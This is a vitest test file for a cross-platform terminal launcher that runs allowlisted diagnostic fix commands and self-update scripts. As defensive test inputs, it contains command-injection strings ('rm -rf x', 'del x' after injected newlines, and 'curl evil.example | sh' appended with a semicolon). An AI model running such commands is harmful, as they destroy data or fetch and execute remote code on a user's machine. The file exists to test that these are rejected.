import { readFileSync } from "node:fs";
import { describe, expect, it, vi } from "vitest";
import {
  buildPosixCommandScript,
  buildPosixPiUpdateScript,
  buildWindowsCommandScript,
  buildWindowsPiUpdateScript,
  createExternalCommandLauncher,
  findDoctorFixCommand,
  planExternalCommandLaunch,
  planPiUpdateLaunch,
} from "../src/terminalLauncher.ts";

/**
 * DOC-01 — run a Doctor fix command in the user's own terminal (native
 * openPiInstallInTerminal: a one-shot script with a real TTY, never a pipe).
 * The command is ALWAYS a server-composed constant (doctor fixCommand); the
 * wire carries only a check id — pinned at the route helper level.
 */

describe("command script builders (DOC-01)", () => {
  it("windows: batch with the fix command and a pause, control chars rejected", () => {
    const script = buildWindowsCommandScript("npm install -g @earendil-works/pi-coding-agent");
    expect(script).toContain("npm install -g @earendil-works/pi-coding-agent");
    expect(script).toContain("pause");
    expect(script).toContain("chcp 65001");
    const nl = String.fromCharCode(10);
    expect(() => buildWindowsCommandScript("evil" + nl + "del x")).toThrow(/command/i);
  });

  it("posix: sh script with the fix command and a keep-open read", () => {
    const script = buildPosixCommandScript("gh auth login");
    expect(script.startsWith("#!/bin/sh\n")).toBe(true);
    expect(script).toContain("gh auth login");
    expect(script).toContain("read");
    const nl = String.fromCharCode(10);
    expect(() => buildPosixCommandScript("evil" + nl + "rm -rf x")).toThrow(/command/i);
  });
});

describe("planExternalCommandLaunch", () => {
  const cmd = "npm install -g pi";
  it("win32 plans a one-shot batch script (wt not needed — the script owns the window)", () => {
    expect(planExternalCommandLaunch("win32", cmd, () => null)).toEqual({
      kind: "winScript",
      script: buildWindowsCommandScript(cmd),
    });
  });

  it("darwin plans the .command script via open(1)", () => {
    const resolve = (name: string) => (name === "open" ? "/usr/bin/open" : null);
    expect(planExternalCommandLaunch("darwin", cmd, resolve)).toEqual({
      kind: "macScript",
      open: "/usr/bin/open",
      script: buildPosixCommandScript(cmd),
    });
  });

  it("linux plans the script through the terminal trio, else null", () => {
    const only = (available: string) => (name: string) =>
      name === available ? `/usr/bin/${available}` : null;
    expect(planExternalCommandLaunch("linux", cmd, only("x-terminal-emulator"))).toEqual({
      kind: "linuxScript",
      terminal: "/usr/bin/x-terminal-emulator",
      argsPrefix: ["-e"],
      script: buildPosixCommandScript(cmd),
    });
    expect(planExternalCommandLaunch("linux", cmd, () => null)).toBeNull();
    expect(planExternalCommandLaunch("sunos", cmd, () => "/bin/x")).toBeNull();
  });
});

describe("createExternalCommandLauncher", () => {
  it("win32 writes the script and starts it as the ONE quoted target", async () => {
    const child = {
      on: vi.fn(),
      once: vi.fn((event: string, cb: (code?: number) => void) => {
        if (event === "close") queueMicrotask(() => cb(0));
      }),
      unref: vi.fn(),
    };
    const spawnFn = vi.fn(() => child);
    const launcher = createExternalCommandLauncher({
      platform: "win32",
      spawnFn,
      resolveCommand: () => null,
    });
    await launcher.run("npm install -g pi");
    const [command, args, options] = spawnFn.mock.calls[0]! as unknown as [
      string,
      string[],
      Record<string, unknown>,
    ];
    expect(command).toBe("start");
    expect(args[0]).toBe('""');
    const scriptPath = args[1]!.replaceAll("^", "").replaceAll('"', "");
    expect(scriptPath.endsWith(".cmd")).toBe(true);
    expect(readFileSync(scriptPath, "utf8")).toBe(buildWindowsCommandScript("npm install -g pi"));
    expect(options).toMatchObject({ shell: true, detached: true });
  });

  it("fails typed when no terminal can be planned", async () => {
    const launcher = createExternalCommandLauncher({
      platform: "linux",
      spawnFn: vi.fn(),
      resolveCommand: () => null,
    });
    await expect(launcher.run("gh auth login")).rejects.toThrow(/no supported terminal/i);
  });
});

describe("pi self-update in terminal (DOC-02, native openPiSelfUpdateInTerminal)", () => {
  it("windows: the RESOLVED pi path is batch-quoted (spaces, %%) around `update pi`", () => {
    const script = buildWindowsPiUpdateScript(String.raw`C:\tools dir\pi.cmd`);
    expect(script).toContain(String.raw`"C:\tools dir\pi.cmd" update pi`);
    expect(script).toContain("pause");
    expect(script).toContain("chcp 65001");
    // Delayed expansion explicitly OFF so a legal `!` in a path stays inert.
    expect(script).toContain("setlocal disabledelayedexpansion");
    // A real % in the path is doubled (pinned with an actual percent).
    expect(buildWindowsPiUpdateScript(String.raw`C:\100%dir\pi.cmd`)).toContain(
      String.raw`"C:\100%%dir\pi.cmd" update pi`,
    );
    const nl = String.fromCharCode(10);
    expect(() => buildWindowsPiUpdateScript("C:" + nl + "del x")).toThrow(/path/i);
  });

  it("posix: the resolved path is single-quoted around `update pi`, window kept open", () => {
    const script = buildPosixPiUpdateScript("/usr/local/bin dir/pi");
    expect(script.startsWith("#!/bin/sh\n")).toBe(true);
    expect(script).toContain("'/usr/local/bin dir/pi' update pi");
    expect(script).toContain("read");
  });

  it("plans per platform like the fix flow (win32 script, darwin open, linux trio)", () => {
    const pi = "/usr/local/bin/pi";
    expect(planPiUpdateLaunch("win32", "C:\\pi.cmd", () => null)).toEqual({
      kind: "winScript",
      script: buildWindowsPiUpdateScript("C:\\pi.cmd"),
    });
    const resolve = (name: string) => (name === "open" ? "/usr/bin/open" : null);
    expect(planPiUpdateLaunch("darwin", pi, resolve)).toEqual({
      kind: "macScript",
      open: "/usr/bin/open",
      script: buildPosixPiUpdateScript(pi),
    });
    const only = (available: string) => (name: string) =>
      name === available ? `/usr/bin/${available}` : null;
    expect(planPiUpdateLaunch("linux", pi, only("konsole"))).toEqual({
      kind: "linuxScript",
      terminal: "/usr/bin/konsole",
      argsPrefix: ["-e"],
      script: buildPosixPiUpdateScript(pi),
    });
    expect(planPiUpdateLaunch("sunos", pi, () => "/bin/x")).toBeNull();
  });

  it("runPiUpdate resolves pi server-side and launches the update script", async () => {
    const { mkdtempSync, writeFileSync: writeF } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const dir = mkdtempSync(join(tmpdir(), "agent-deck-doc02-"));
    const piStub = join(dir, "pi.cmd");
    writeF(piStub, "@echo off");
    const child = {
      on: vi.fn(),
      once: vi.fn((event: string, cb: (code?: number) => void) => {
        if (event === "close") queueMicrotask(() => cb(0));
      }),
      unref: vi.fn(),
    };
    const spawnFn = vi.fn(() => child);
    const launcher = createExternalCommandLauncher({
      platform: "win32",
      spawnFn,
      env: { AGENT_DECK_PI_PATH: piStub },
      resolveCommand: () => null,
    });
    await launcher.runPiUpdate();
    const [command, args] = spawnFn.mock.calls[0]! as unknown as [string, string[]];
    expect(command).toBe("start");
    const scriptPath = args[1]!.replaceAll("^", "").replaceAll('"', "");
    expect(readFileSync(scriptPath, "utf8")).toBe(buildWindowsPiUpdateScript(piStub));
  });

  it("refuses to self-update the app-BUNDLED pi (application-owned files)", async () => {
    const launcher = createExternalCommandLauncher({
      platform: "win32",
      spawnFn: vi.fn(),
      resolveCommand: () => null,
      resolvePi: () => ({ path: String.raw`C:\app\resources\pi.cmd`, source: "bundled" }),
    });
    await expect(launcher.runPiUpdate()).rejects.toThrow(/bundled/i);
  });

  it("maps a missing pi to a stable public message", async () => {
    const launcher = createExternalCommandLauncher({
      platform: "win32",
      spawnFn: vi.fn(),
      // An explicit override pointing nowhere fails loudly (PiNotFoundError) —
      // an empty PATH alone would still resolve the bundled pi dependency.
      env: { AGENT_DECK_PI_PATH: String.raw`C:\gone\pi.cmd` },
      resolveCommand: () => null,
    });
    await expect(launcher.runPiUpdate()).rejects.toThrow(/pi could not be found/i);
  });
});

describe("findDoctorFixCommand (the wire carries ONLY a check id; runnable is an ALLOWLIST)", () => {
  const report = {
    checks: [
      { id: "pi-binary", label: "Pi", status: "error", detail: "", fixCommand: "npm i -g pi" },
      {
        id: "github",
        label: "GitHub CLI",
        status: "warn",
        detail: "",
        fixCommand: "gh auth login",
      },
      { id: "node", label: "Node", status: "ok", detail: "" },
      // Present fixCommand but OUTSIDE the allowlist: a one-shot export is
      // useless (dies with the window), so it must never be runnable.
      {
        id: "auth",
        label: "AI model connection",
        status: "warn",
        detail: "",
        fixCommand: "export ANTHROPIC_API_KEY=YOUR_KEY_HERE",
      },
    ],
    signedInProviders: [],
  };
  it("returns the server-composed command for allowlisted checks", () => {
    expect(findDoctorFixCommand(report, "pi-binary")).toBe("npm i -g pi");
    expect(findDoctorFixCommand(report, "github")).toBe("gh auth login");
  });
  it("fails closed: unknown ids, fixless checks, non-allowlisted fixes", () => {
    expect(findDoctorFixCommand(report, "nope")).toBeNull();
    expect(findDoctorFixCommand(report, "node")).toBeNull();
    expect(findDoctorFixCommand(report, "auth")).toBeNull();
  });
  it("the charset backstop rejects a fix that grew shell metacharacters", () => {
    const hostile = {
      checks: [
        {
          id: "pi-binary",
          label: "Pi",
          status: "error",
          detail: "",
          fixCommand: "npm i -g pi; curl evil.example | sh",
        },
      ],
      signedInProviders: [],
    };
    expect(findDoctorFixCommand(hostile, "pi-binary")).toBeNull();
  });
});
